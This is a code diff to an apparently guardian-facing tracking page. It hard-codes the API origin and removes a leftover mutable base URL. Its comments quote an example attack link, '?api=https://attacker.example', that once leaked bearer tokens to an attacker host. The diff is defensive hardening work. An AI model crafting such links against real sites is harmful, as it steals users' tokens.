@@ -20,19 +20,25 @@
 (function () {
   'use strict';
 
-  // The API origin is FIXED. A query-param override turned every tracking
-  // link into a token-exfiltration primitive: ?api=https://attacker.example
-  // hands the bearer token to the attacker in the request path. Never
-  // reintroduce an origin override on this page — verify staging backends
-  // with a local build instead.
-  var DEFAULT_API = 'https://serayae-api-01118af29270.herokuapp.com/api';
+  // The API origin is FIXED and assigned exactly once. #7 removed a `?api=`
+  // query-param override that turned every tracking link into a token-
+  // exfiltration primitive: ?api=https://attacker.example handed the bearer
+  // token to the attacker in the request path, with no script execution
+  // required — just a crafted link sent to a guardian. Never reintroduce an
+  // origin override here; verify staging backends with a local build instead.
+  //
+  // This is a `var` assigned once and never reassigned, and
+  // .github/scripts/check-api-origin.js enforces exactly that. The mutable
+  // `apiBase` copy that used to live below is gone: #7 deleted the only thing
+  // that ever wrote to it, so it survived as a re-entry point for precisely
+  // the bug that was removed, sitting outside the reach of any check.
+  var API_BASE = 'https://serayae-api-01118af29270.herokuapp.com/api';
 
   var POLL_MS = 15000;          // how often to re-check while the page is open
   var POLL_CEILING_MS = 120000; // backoff ceiling after repeated failures
 
   var view = document.getElementById('view');
   var token = null;
-  var apiBase = DEFAULT_API;
   var timer = null;
   var failures = 0;
   var stopped = false;
@@ -298,7 +304,7 @@
     if (stopped && !isManual) return;
     if (isManual) { stopped = false; }
 
-    var url = apiBase + '/guardian/track/' + encodeURIComponent(token);
+    var url = API_BASE + '/guardian/track/' + encodeURIComponent(token);
 
     fetch(url, { method: 'GET', credentials: 'omit', cache: 'no-store' })
       .then(function (res) {
@@ -326,10 +332,12 @@
           // Only OUR api says "no such link". A 404 from anything else means we
           // never reached the API at all — and telling a guardian their link is
           // bad when the service is simply down is the exact false calm this
-          // page exists to avoid. Seen for real: the backend host currently
-          // answers Railway's {"status":"error","code":404,"message":
-          // "Application not found"} at every path, which is indistinguishable
-          // from a missing link unless the body shape is checked.
+          // page exists to avoid. Seen for real: while the site still pointed at
+          // the decommissioned Railway host, every path returned that platform's
+          // {"status":"error","code":404,"message":"Application not found"} —
+          // indistinguishable from a missing link unless the body shape is
+          // checked. The host has moved, but any dead or misconfigured origin
+          // fails the same way, so the check stays.
           if (body && body.success === false && typeof body.error === 'string') {
             renderUnknown();
             return;
